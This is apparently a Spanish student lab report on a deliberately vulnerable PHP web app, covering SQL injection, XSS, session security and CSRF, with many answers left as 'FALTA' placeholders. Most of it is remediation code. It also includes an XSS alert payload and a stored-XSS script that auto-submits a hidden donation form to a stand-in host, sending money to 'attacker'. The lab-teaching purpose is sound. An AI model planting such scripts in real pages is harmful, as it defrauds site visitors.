# Parte 1 - SQLi
La página no permite añadir jugadores a usuarios no autenticados, un formulario nos exige que introduzcamos un usuario y contraseña válidos. Lo primero que haremos es comprobar que este formulario es vulnerable a una inyección y aprovecharlo para saltarnos esta protección.

**A) Dad un ejemplo de combinación de usuario y contraseña que provoque un error en la consulta SQL generada por este formulario. Apartir del mensaje de error obtenido, decid cuál es la consulta SQL que se ejecuta, cuál de los campos introducidos al formulario utiliza y cuál no.**

![FALTA]()

**B) Gracias a la SQL Injection del apartado anterior, sabemos que este formulario es vulnerable y conocemos el nombre de los campos de la tabla “users”. Para tratar de impersonar a un usuario, nos hemos descargado un diccionario que contiene algunas de las contraseñas más utilizadas (se listan a continuación):**

**- password**

**- 123456**

**- 12345678**

**- 1234**

**- qwerty**

**- 12345678**

**- dragon**

**Dad un ataque que, utilizando este diccionario, nos permita impersonar un usuario de esta aplicación y acceder en nombre suyo. Tened en cuenta que no sabéis ni cuántos usuarios hay registrados en la aplicación, ni los nombres de estos.**

![FALTA]()

**C) Si vais a `private/auth.php`, veréis que en la función `areUserAndPasswordValid`, se utiliza “SQLite3::escapeString()”, pero, aun así, el formulario es vulnerable a SQL Injections, explicad cuál es el error de programación de esta función y como lo podéis corregir.**

**Explicación del error: Vulnerabilidad a SQL Injection**

En el código original, la consulta SQL se construye concatenando directamente los valores del usuario (`$user`) en la consulta:

```php
$query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"');
```

Aunque se utiliza `SQLite3::escapeString()`, este método no es completamente seguro para prevenir ataques de inyección SQL. Un atacante podría intentar manipular la entrada para ejecutar consultas SQL maliciosas que comprometan la base de datos, lo que constituye una vulnerabilidad de **SQL Injection**.

**Solución: Cambiar la línea con el código vulnerable por la siguiente línea**

Para solucionar este problema, la consulta SQL debe construirse utilizando sentencias preparadas con parámetros. Las sentencias preparadas separan la consulta SQL de los datos proporcionados por el usuario, evitando así las inyecciones SQL.

La línea de código original:

```php
$query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"');
```

Debe ser reemplazada por el siguiente código usando una sentencia preparada:

```php
$stmt = $db->prepare('SELECT userId, password FROM users WHERE username = :user');
$stmt->bindValue(':user', $user, SQLITE3_TEXT);
$result = $stmt->execute();
```

**D) Si habéis tenido éxito con el apartado b), os habéis autenticado utilizando el usuario `luis` (si no habéis tenido éxito, podéis utilizar la contraseña 1234 para realizar este apartado). Con el objetivo de mejorar la imagen de la jugadora Candela Pacheco, le queremos escribir un buen puñado de comentarios positivos, pero no los queremos hacer todos con la misma cuenta de usuario.**

**Para hacer esto, en primer lugar habéis hecho un ataque de fuerza bruta sobre eldirectorio del servidor web (por ejemplo, probando nombres de archivo) y habéis encontrado el archivo `add\_comment.php~`. Estos archivos seguramente se han creado como copia de seguridad al modificar el archivo “.php” original directamente al servidor. En general, los servidores web no interpretan (ejecuten) los archivos `.php~` sino que los muestran como archivos de texto sin interpretar.**

**Esto os permite estudiar el código fuente de `add\_comment.php` y encontrar una vulnerabilidad para publicar mensajes en nombre de otros usuarios. ¿Cuál es esta vulnerabilidad, y cómo es el ataque que utilizáis para explotarla?**

![FALTA]()

<br><br><br>

# Parte 2 - XSS
En vistas de los problemas de seguridad que habéis encontrado, empezáis a sospechar que esta aplicación quizás es vulnerable a XSS (Cross Site Scripting).

### **A) Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments php). Dad un mensaje que genere un «alert»de Javascript al consultar el listado de mensajes.**

Introduzco el mensaje `<script>alert('XSS detectado');</script>`

En el formulario de la página `show_comments.php`

### **B) Por qué dice `&amp;` cuando miráis un link (como elque aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GETdentro de código html si en realidad el link es sólo con "&" ?**

Explicación:

El carácter `&amp;` es la forma codificada del carácter & en HTML. Esto sucede porque en el código fuente de la página, el carácter & está correctamente escapado como `&amp;`. La razón para esto es prevenir errores en el análisis del HTML o posibles vulnerabilidades en el navegador.

### **C) Explicad cuál es el problema de `show\_comments.php`, y cómo lo arreglaríais. Para resolver este apartado, podéis mirar el código fuente de esta página.**

El código no realiza ningún tipo de validación o sanitización de los datos recuperados de la base de datos (en este caso, los comentarios) antes de mostrarlos en la página. Específicamente:

```php
echo "<div>
        <h4> ". $row['username'] ."</h4> 
        <p>commented: " . $row['body'] . "</p>
      </div>";
```

El contenido de `$row['username']` y `$row['body']` proviene directamente de la base de datos y se inserta en el HTML sin procesarlo. Si un usuario malintencionado ha añadido un comentario que contiene código JavaScript (por ejemplo, `<script>alert('XSS');</script>`), este será ejecutado en el navegador de cualquier persona que visite la página.

**Cómo arreglar el problema**

1. **Sanitizar la salida con `htmlspecialchars`**
   - Antes de imprimir cualquier dato, escapa los caracteres especiales usando la función `htmlspecialchars` para evitar la ejecución de código JavaScript malicioso.
   - Modifica el bloque de código problemático de esta manera: (L-37/41)
     ```php
     echo "<div>
             <h4> ". htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8') ."</h4> 
             <p>commented: " . htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8') . "</p>
           </div>";
     ```

2. **Implementar una Política de Seguridad de Contenidos (CSP)**
   - Añade encabezados HTTP que limiten la ejecución de scripts no autorizados en la página:
     ```php
     header("Content-Security-Policy: script-src 'self';");
     ```

### **D) Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.**

![FALTA]()

<br><br><br>

# Parte 3 - Control de acceso, autenticación y sesiones de usuarios

### **A) En el ejercicio 1, hemos visto cómo era inseguro el acceso de los usuarios a la aplicación. En la página de `register.php` tenemos el registro de usuario. ¿Qué medidas debemos implementar para evitar que el registro sea inseguro? Justifica esas medidas e implementa las medidas que sean factibles en este proyecto.**

El código actual presenta varias vulnerabilidades y carece de las medidas de seguridad necesarias para garantizar que el registro sea seguro. Aquí tienes una explicación de los problemas identificados y las implementaciones sugeridas:

**Medidas de Seguridad Propuestas e Implementación**

1. **Validación y sanitización de datos**
Antes de procesar los datos, verifica y sanitiza las entradas del usuario.

```php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);
    
    // Validar formato del nombre de usuario
    if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
        die("El nombre de usuario debe tener entre 3 y 20 caracteres alfanuméricos o guiones bajos.");
    }

    // Validar longitud de la contraseña
    if (strlen($password) < 8) {
        die("La contraseña debe tener al menos 8 caracteres.");
    }
}
```

2. **Almacenamiento seguro de contraseñas**
Usa `password_hash()` para almacenar las contraseñas en lugar de guardarlas en texto plano.

```php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = SQLite3::escapeString($username);
    $hashedPassword = password_hash($password, PASSWORD_DEFAULT); // Hashea la contraseña

    $query = "INSERT INTO users (username, password) VALUES ('$username', '$hashedPassword')";

    if (!$db->query($query)) {
        die("Error al registrar al usuario.");
    }
    header("Location: list_players.php");
}
```

---

3. **Uso de consultas preparadas para prevenir inyecciones SQL**
Las consultas preparadas son una mejor práctica para proteger contra inyecciones SQL.

```php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $stmt = $db->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $stmt->bindValue(':password', $hashedPassword, SQLITE3_TEXT);

    if (!$stmt->execute()) {
        die("Error al registrar al usuario.");
    }
    header("Location: list_players.php");
}
```

---

4. **Restringir el acceso al formulario de registro**
Evita que usuarios autenticados accedan al formulario de registro.

```php
session_start();
if (isset($_SESSION['user_id'])) {
    header("Location: dashboard.php");
    exit;
}
```

---
5. **Protección contra CSRF**
Genera y verifica un token CSRF para proteger el formulario contra ataques.

**Implementación (en el formulario):**
```php
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>
<input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
```

**Verificación al procesar el formulario:**
```php
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("Token CSRF inválido.");
}
```

### **B) En el apartado de login de la aplicación, también deberíamos implantar una serie de medidas para que sea seguro el acceso, (sin contar la del ejercicio 1.c). Como en el ejercicio anterior, justifica esas medidas e implementa las que sean factibles y necesarias (ten en cuenta las acciones realizadas en el register). Puedes mirar en la carpeta `private`**

El código del archivo `auth.php` presenta varios problemas de seguridad graves que deben ser abordados para garantizar un entorno más seguro. A continuación, detallo las vulnerabilidades y las medidas específicas para solucionarlas, como respuesta al apartado **b. ¿Qué medidas implementaría para asegurar el acceso al login?**:

**Medidas para Asegurar el Acceso al Login:**

1. **Cifrado de Contraseñas en la Base de Datos:**
   - Utilizar `password_hash()` para almacenar las contraseñas y `password_verify()` para validarlas:
     ```php
     $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
     ```
     - Al autenticar:
       ```php
       if (password_verify($password, $row['password'])) { 
           // Login exitoso
       }
       ```

2. **Uso de Consultas Preparadas:**
   - Sustituir la consulta actual por una consulta preparada con parámetros para evitar inyecciones SQL:
     ```php
     $stmt = $db->prepare("SELECT userId, password FROM users WHERE username = :username");
     $stmt->bindValue(':username', $user, SQLITE3_TEXT);
     $result = $stmt->execute();
     ```

3. **Eliminar Credenciales de las Cookies:**
   - Las cookies no deben contener información sensible como credenciales. En su lugar, usar sesiones PHP:
     ```php
     session_start();
     $_SESSION['userId'] = $userId;
     ```

4. **Configurar las Cookies de Sesión con Seguridad Adicional:**
   - Hacer las cookies más seguras configurando atributos:
     ```php
     ini_set('session.cookie_httponly', true);
     ini_set('session.cookie_secure', true); // Requiere HTTPS
     ini_set('session.use_strict_mode', true);
     ```

5. **Implementar Límite de Intentos:**
   - Registrar intentos de login fallidos y bloquear cuentas temporalmente tras varios intentos consecutivos:
     ```php
     if ($failedAttempts >= 5) {
         die("Cuenta bloqueada temporalmente.");
     }
     ```

6. **Validación y Sanitización de Entradas:**
   - Sanitizar las entradas del usuario para evitar inyecciones de código malicioso:
     ```php
     $username = filter_var($username, FILTER_SANITIZE_STRING);
     ```

7. **Política de Logout Segura:**
   - Asegurarse de que las sesiones se destruyan completamente al cerrar sesión:
     ```php
     session_start();
     $_SESSION = [];
     session_destroy();
     ```

8. **Protección contra CSRF:**
    - Generar y verificar tokens CSRF en formularios sensibles como el login:
      ```php
      $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
      ```

### **C) Volvemos a la página de `register.php`, vemos que está accesible para cualquier usuario, registrado o sin registrar. Al ser una aplicación en la cual no debería dejar a los usuarios registrarse, qué medidas podríamos tomar para poder gestionarlo e implementa las medidas que sean factibles en este proyecto.**

![FALTA]()

### **D) Al comienzo de la práctica hemos supuesto que la carpeta `private` no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?**

![FALTA]()

### **E) Por último, comprobando el flujo de la sesión del usuario. Analiza si está bien asegurada la sesión del usuario y que no podemos suplantar a ningún usuario. Si no está bien asegurada, qué acciones podríamos realizar e implementarlas.**

![FALTA]()

<br><br><br>

# Parte 4 - Servidores web

**¿Qué medidas de seguridad se implementariaís en el servidor web para reducir el riesgo a ataques?**

![FALTA]()

<br><br><br>

# Parte 5 - CSRF
Ahora ya sabemos que podemos realizar un ataque XSS. Hemos preparado el siguiente enlace: http://web.pagos/donate.php?amount=100&receiver=attacker, mediante el cual, cualquiera que haga click hará una donación de 100€ al nuestro usuario (con nombre 'attacker') de la famosa plataforma de pagos online 'web.pagos' (Nota: como en realidad esta es una dirección inventada, vuestro navegador os devolverá un error 404).

**A) Editad un jugador para conseguir que, en el listado de jugadores `list\_players.php` aparezca, debajo del nombre de su equipo y antes de `show/add comments` un botón llamado Profile que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.**

**B) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que elusuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (`show\_comments.php`).**

Añadimos un codigo malicios en los comentarios de los jugadores

```html
<script>
    var form = document.createElement('form');
    form.method = 'GET';
    form.action = 'http://web.pagos/donate.php';
    
    var amountField = document.createElement('input');
    amountField.type = 'hidden';
    amountField.name = 'amount';
    amountField.value = '100';
    
    var receiverField = document.createElement('input');
    receiverField.type = 'hidden';
    receiverField.name = 'receiver';
    receiverField.value = 'attacker';
    
    form.appendChild(amountField);
    form.appendChild(receiverField);
    
    document.body.appendChild(form);
    form.submit();
</script>
```
Este código crea un formulario oculto con los parámetros necesarios (amount y receiver) y lo envía automáticamente al servidor de donaciones cuando el comentario es cargado.


**C) Pero web.pagos sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.**

**Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).**

- Sesión activa: Si el sistema web.pagos requiere que los usuarios estén logueados para realizar cualquier tipo de transacción (como una donación), será necesario que el navegador del usuario ya tenga una cookie de sesión activa que permita autenticarlo. Esto es lo que permite identificar al usuario y asociarlo con su cuenta.

- Transacción entre usuarios registrados: Al ser un sistema de pagos entre usuarios registrados, web.pagos utilizará la cookie de sesión o un token de autenticación para identificar a quien está haciendo la donación y deducir el dinero de su cuenta. Este es el paso clave: la transacción solo puede ocurrir si el usuario tiene una cuenta registrada y activa dentro de web.pagos.

- Verificación de usuario: Si el usuario está logueado en la plataforma, el ataque será exitoso, ya que la donación se efectuará desde la cuenta del usuario víctima (que está visualizando el comentario o interactuando con el botón malicioso). Si el usuario no está logueado o no tiene una sesión activa, el ataque fallará, porque web.pagos no podrá deducir los 100€ de su cuenta.

**D) Si web.pagos modifica la página `donate.php` para que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” i “receiver” por POST.**

![FALTA]()
